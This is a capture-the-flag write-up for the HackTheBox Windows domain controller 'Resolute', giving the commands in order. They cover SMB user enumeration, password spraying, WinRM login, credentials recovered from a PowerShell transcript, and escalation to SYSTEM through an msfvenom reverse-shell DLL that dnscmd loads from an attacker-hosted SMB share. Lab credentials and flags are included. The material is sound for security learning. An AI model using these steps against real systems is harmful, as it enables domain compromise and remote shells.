# CTF: Resolute (HTB)

## Metadata

- **Target IP:** 10.129.234.181
    
- **OS:** Windows (Server 2016)
    
- **Difficulty:** Easy/Medium
    
- **Date:** 2026-01-06
    
- **Tags:** #HTB #Windows #ActiveDirectory #PasswordSpraying #DNSAdmins
    

---

## Reconnaissance

### Port Scanning

A full TCP port scan identifies a standard Domain Controller setup.

Bash

```
nmap -p- -Pn -v --min-rate 1000 -oN nmap_ports.txt $target
```

**Key Ports:**

- **53/tcp**: DNS
    
- **88/tcp**: Kerberos
    
- **389/tcp**: LDAP
    
- **445/tcp**: SMB
    
- **5985/tcp**: WinRM (Remote Management)
    

### User Enumeration

Using a null session via `netexec`, I was able to enumerate the domain users. I noticed a particularly interesting description field for the user `marko`.

Bash

```
netexec smb $target -u '' -p '' --users
```

> **Note:** The description for `marko` read: `Account created. Password set to Welcome123!`.

---

## Credential Cracking

### Password Spraying

While the password `Welcome123!` failed for `marko` (likely because he followed instructions and changed it), users often reuse "default" passwords or admins apply them across multiple accounts.

I generated a user list from the SMB enumeration and sprayed the password:

Bash

```
netexec smb $target -u users.txt -p 'Welcome123!'
```

**Result:** * `[+] megabank.local\melanie:Welcome123!`

---

## Foothold

### Melanie Initial Access

With valid credentials for `melanie`, I verified WinRM access and logged in to collect the user flag.

Bash

```
netexec winrm $target -u melanie -p 'Welcome123!'
evil-winrm -i $target -u melanie -p 'Welcome123!'
```

- **User Flag:** `9d1908d9ad81298583e3fc60cb43b55b`
    

---

## Lateral Movement

### PowerShell Transcript Leak

While exploring Melanie’s environment, I found a non-standard directory `C:\PSTranscripts`. PowerShell transcription can be a security feature, but if misconfigured, it logs sensitive commands in plaintext.

PowerShell

```
type C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Inside the transcript, I found a command executed by user `ryan`: `cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!`

**New Credentials:**

- **User:** `ryan`
    
- **Password:** `Serv3r4Admin4cc123!`
    

---

## Privilege Escalation

### DNSAdmins DLL Injection

After moving to `ryan`, enumeration (likely via `whoami /groups`) would reveal that `ryan` is a member of the **DNSAdmins** group. This group has the privilege to load a custom helper DLL into the DNS service, which runs as `nt authority\system`.

#### 1. Generate Malicious DLL

On my Kali machine, I created a reverse shell DLL.

Bash

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=9001 -f dll > rev.dll
```

#### 2. Host the DLL

I used Impacket’s SMB server to host the DLL so the target could reach it.

Bash

```
sudo impacket-smbserver test $(pwd)
```

#### 3. Inject and Restart Service

Using `dnscmd.exe`, I configured the DNS service to load my malicious DLL upon the next start.

PowerShell

```
dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.9\test\rev.dll
sc.exe stop dns
sc.exe start dns
```

#### 4. Catch the Shell

My listener caught the connection from the DNS service process.

Bash

```
nc -nvlp 9001
# whoami -> nt authority\system
```

---

## Flags

- **User (melanie):** `9d1908d9ad81298583e3fc60cb43b55b`
    
- **Root (SYSTEM):** `524f90929626477b0dc3576ff4087962`
